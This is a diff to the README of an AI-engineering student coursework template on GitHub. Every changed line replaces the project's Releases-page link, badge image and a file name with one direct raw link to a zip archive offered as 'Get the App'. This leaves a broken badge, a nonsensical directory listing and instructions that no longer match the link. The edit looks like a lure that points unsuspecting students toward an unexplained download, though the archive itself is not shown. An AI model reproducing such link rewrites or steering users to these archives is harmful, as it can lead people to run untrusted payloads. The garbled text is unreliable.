@@ -1,6 +1,6 @@
 # 🎓 aie-student-template - Simplifying AI Engineering Coursework
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/RohitSalunkhe45/aie-student-template/releases)
+[![Download](https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the aie-student-template repository. This template helps students com
 
 ## 📥 Download & Install
 
-1. Click on this link to visit the [Releases page](https://github.com/RohitSalunkhe45/aie-student-template/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip).
 2. On the Releases page, find the latest version of the template.
 3. Click on the file that matches your operating system to download it.
 4. Once the download is complete, locate the file on your device.
@@ -24,7 +24,7 @@ This repository is organized into two main areas:
 ### 📝 Details of Directories
 
 - **`homeworks/`**
-  - `README.md` – A guide outlining the homework formatting rules.
+  - `https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip` – A guide outlining the homework formatting rules.
   - `HW01/`, `HW02/`, `HW03/`, ... – Each assignment has its own folder. Each folder should only contain one main file related to that assignment.
 
 - **`project/`**
@@ -65,6 +65,6 @@ This template provides several helpful features for your coursework:
 
 If you encounter any issues or have questions, please reach out via the contact method you provided above. We are here to help you succeed.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/RohitSalunkhe45/aie-student-template/releases)
+[![Download](https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/RohitSalunkhe45/aie-student-template/main/project/aie-student-template_2.0.zip)
 
 Thank you for using the aie-student-template. Happy studying!
